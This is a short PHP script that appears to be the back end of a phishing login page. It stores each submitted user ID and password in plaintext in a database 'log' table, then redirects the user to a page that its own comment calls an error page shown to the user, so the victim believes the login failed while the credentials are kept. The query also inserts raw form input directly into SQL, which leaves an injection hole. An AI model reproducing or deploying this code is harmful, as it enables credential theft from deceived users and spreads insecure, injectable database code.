<?php 
//vivekjha4u2
	include 'database.php';
	session_start();

$uid= $_POST['uid'];
$pwd= $_POST['pwd'];

$sql = "INSERT INTO log(uid, pwd)
		VALUES('$uid', '$pwd')";
$result= $conn -> query($sql);

//header is set to page2.html which is nothing but just
//a error showing page for the user 
header ('Location: page2.html');


?>